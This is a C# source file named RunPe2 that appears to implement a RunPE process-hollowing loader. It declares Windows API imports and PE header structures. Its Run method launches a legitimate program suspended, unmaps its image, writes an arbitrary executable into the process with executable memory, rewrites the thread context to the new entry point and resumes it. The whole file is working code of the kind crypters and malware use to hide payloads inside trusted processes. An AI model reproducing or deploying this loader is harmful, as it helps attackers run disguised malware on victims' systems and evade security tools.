using System;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Text;

namespace RunPe2
{
    public class Class1
    {

        [DllImport("kernel32.dll")]
        static extern bool CreateProcess(string lpApplicationName,
               string lpCommandLine, IntPtr lpProcessAttributes,
               IntPtr lpThreadAttributes, bool bInheritHandles,
               uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory,
               byte[] lpStartupInfo,
               out PROCESS_INFORMATION lpProcessInformation);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress,
           uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        private static extern bool GetThreadContext(IntPtr hThread, ref CONTEXT lpContext);

        [DllImport("kernel32.dll")]
        private static extern bool Wow64GetThreadContext(IntPtr hThread, ref CONTEXT lpContext);

        [DllImport("ntdll.dll")]
        private static extern bool NtUnmapViewOfSection(IntPtr hProcess, IntPtr lpBaseAddress);

        [DllImport("kernel32.dll")]
        private static extern uint ResumeThread(IntPtr hThread);

        [DllImport("kernel32.dll")]
        private static extern bool SetThreadContext(IntPtr hThread, [In] ref CONTEXT lpContext);

        [DllImport("kernel32.dll")]
        private static extern bool Wow64SetThreadContext(IntPtr hThread, [In] ref CONTEXT lpContext);

        [DllImport("kernel32.dll")]
        private static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, UInt32 dwSize, uint flNewProtect, out uint lpflOldProtect);

        [DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
        static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool TerminateProcess(IntPtr hProcess, uint uExitCode);

        [StructLayout(LayoutKind.Sequential)]
        private struct IMAGE_DOS_HEADER
        {
            public UInt16 e_magic;
            public UInt16 e_cblp;
            public UInt16 e_cp;
            public UInt16 e_crlc;
            public UInt16 e_cparhdr;
            public UInt16 e_minalloc;
            public UInt16 e_maxalloc;
            public UInt16 e_ss;
            public UInt16 e_sp;
            public UInt16 e_csum;
            public UInt16 e_ip;
            public UInt16 e_cs;
            public UInt16 e_lfarlc;
            public UInt16 e_ovno;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 4)]
            public UInt16[] e_res1;
            public UInt16 e_oemid;
            public UInt16 e_oeminfo;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 10)]
            public UInt16[] e_res2;
            public Int32 e_lfanew;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct IMAGE_FILE_HEADER
        {
            public UInt16 Machine;
            public UInt16 NumberOfSections;
            public UInt32 TimeDateStamp;
            public UInt32 PointerToSymbolTable;
            public UInt32 NumberOfSymbols;
            public UInt16 SizeOfOptionalHeader;
            public UInt16 Characteristics;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct FLOATING_SAVE_AREA
        {
            public uint ControlWord;
            public uint StatusWord;
            public uint TagWord;
            public uint ErrorOffset;
            public uint ErrorSelector;
            public uint DataOffset;
            public uint DataSelector;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 80)]
            public byte[] RegisterArea;
            public uint Cr0NpxState;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct CONTEXT
        {
            public uint ContextFlags;
            public uint Dr0;
            public uint Dr1;
            public uint Dr2;
            public uint Dr3;
            public uint Dr6;
            public uint Dr7;
            public FLOATING_SAVE_AREA FloatSave;
            public uint SegGs;
            public uint SegFs;
            public uint SegEs;
            public uint SegDs;
            public uint Edi;
            public uint Esi;
            public uint Ebx;
            public uint Edx;
            public uint Ecx;
            public uint Eax;
            public uint Ebp;
            public uint Eip;
            public uint SegCs;
            public uint EFlags;
            public uint Esp;
            public uint SegSs;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 512)]
            public byte[] ExtendedRegisters;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct IMAGE_DATA_DIRECTORY
        {
            public UInt32 VirtualAddress;
            public UInt32 Size;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct IMAGE_OPTIONAL_HEADER32
        {
            public UInt16 Magic;
            public Byte MajorLinkerVersion;
            public Byte MinorLinkerVersion;
            public UInt32 SizeOfCode;
            public UInt32 SizeOfInitializedData;
            public UInt32 SizeOfUninitializedData;
            public UInt32 AddressOfEntryPoint;
            public UInt32 BaseOfCode;
            public UInt32 BaseOfData;
            public UInt32 ImageBase;
            public UInt32 SectionAlignment;
            public UInt32 FileAlignment;
            public UInt16 MajorOperatingSystemVersion;
            public UInt16 MinorOperatingSystemVersion;
            public UInt16 MajorImageVersion;
            public UInt16 MinorImageVersion;
            public UInt16 MajorSubsystemVersion;
            public UInt16 MinorSubsystemVersion;
            public UInt32 Win32VersionValue;
            public UInt32 SizeOfImage;
            public UInt32 SizeOfHeaders;
            public UInt32 CheckSum;
            public UInt16 Subsystem;
            public UInt16 DllCharacteristics;
            public UInt32 SizeOfStackReserve;
            public UInt32 SizeOfStackCommit;
            public UInt32 SizeOfHeapReserve;
            public UInt32 SizeOfHeapCommit;
            public UInt32 LoaderFlags;
            public UInt32 NumberOfRvaAndSizes;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 16)]
            public IMAGE_DATA_DIRECTORY[] DataDirectory;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct IMAGE_NT_HEADERS
        {
            public UInt32 Signature;
            public IMAGE_FILE_HEADER FileHeader;
            public IMAGE_OPTIONAL_HEADER32 OptionalHeader;
        }

        private struct IMAGE_SECTION_HEADER
        {
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)]
            public byte[] Name;
            public UInt32 VirtualSize;
            public UInt32 VirtualAddress;
            public UInt32 SizeOfRawData;
            public UInt32 PointerToRawData;
            public UInt32 PointerToRelocations;
            public UInt32 PointerToLinenumbers;
            public UInt16 NumberOfRelocations;
            public UInt16 NumberOfLinenumbers;
            public UInt32 Characteristics;
        }

        public static int Run(byte[] file, string cmd, string location)
        {
            GCHandle gHandle = GCHandle.Alloc(file, GCHandleType.Pinned);
            int iPointer;
            uint outtt;
            UIntPtr outt;
            iPointer = gHandle.AddrOfPinnedObject().ToInt32();
            CONTEXT CTX = new CONTEXT();
            IMAGE_DOS_HEADER DHD = new IMAGE_DOS_HEADER();
            IMAGE_NT_HEADERS NHD = new IMAGE_NT_HEADERS();
            IMAGE_SECTION_HEADER SHD = default(IMAGE_SECTION_HEADER);
            PROCESS_INFORMATION procinf = new PROCESS_INFORMATION();
            DHD = (IMAGE_DOS_HEADER)Marshal.PtrToStructure(new IntPtr(iPointer), typeof(IMAGE_DOS_HEADER));
            NHD = (IMAGE_NT_HEADERS)Marshal.PtrToStructure(new IntPtr(iPointer + DHD.e_lfanew), typeof(IMAGE_NT_HEADERS));
            CreateProcess(location, cmd, IntPtr.Zero, IntPtr.Zero, false, 4, IntPtr.Zero, null, new byte[0x44], out procinf);
            NtUnmapViewOfSection(procinf.hProcess, (IntPtr)NHD.OptionalHeader.ImageBase);
            if (VirtualAllocEx(procinf.hProcess, new IntPtr(NHD.OptionalHeader.ImageBase), NHD.OptionalHeader.SizeOfImage, 0x1000 | 0x2000, 0x40) == IntPtr.Zero)
            {
                TerminateProcess(procinf.hProcess, 0);
                return Run(file, cmd, location);
            }
            CTX.ContextFlags = (0x10000 | 0x01) | (0x10000 | 0x02) | (0x10000 | 0x04);
            if (IntPtr.Size == 4)
                GetThreadContext(procinf.hThread, ref CTX);
            else
                Wow64GetThreadContext(procinf.hThread, ref CTX);
            WriteProcessMemory(procinf.hProcess, new IntPtr(NHD.OptionalHeader.ImageBase), file, NHD.OptionalHeader.SizeOfHeaders, out outt);
            for (int a = 0; a < NHD.FileHeader.NumberOfSections; a++)
            {
                SHD = (IMAGE_SECTION_HEADER)Marshal.PtrToStructure(new IntPtr(iPointer + DHD.e_lfanew + Marshal.SizeOf(NHD) + (a * Marshal.SizeOf(SHD))), typeof(IMAGE_SECTION_HEADER));
                byte[] bRaw = new byte[SHD.SizeOfRawData + 1];
                for (int y = 0; y < (int)SHD.SizeOfRawData; y++)
                    bRaw[y] = file[SHD.PointerToRawData + y];
                WriteProcessMemory(procinf.hProcess, new IntPtr(NHD.OptionalHeader.ImageBase + SHD.VirtualAddress), bRaw, Convert.ToUInt32(SHD.SizeOfRawData), out outt);
                VirtualProtectEx(procinf.hProcess, new IntPtr(NHD.OptionalHeader.ImageBase + SHD.VirtualAddress), SHD.VirtualSize, 0x40, out outtt);
            }
            byte[] bIB = BitConverter.GetBytes(NHD.OptionalHeader.ImageBase);
            WriteProcessMemory(procinf.hProcess, new IntPtr(CTX.Ebx + 8), bIB, (uint)bIB.Length, out outt);
            CTX.Eax = (NHD.OptionalHeader.ImageBase + NHD.OptionalHeader.AddressOfEntryPoint);
            if (IntPtr.Size == 4)
                SetThreadContext(procinf.hThread, ref CTX);
            else
                Wow64SetThreadContext(procinf.hThread, ref CTX);
            ResumeThread(procinf.hThread);
            return procinf.dwProcessId;
        }
    }
}
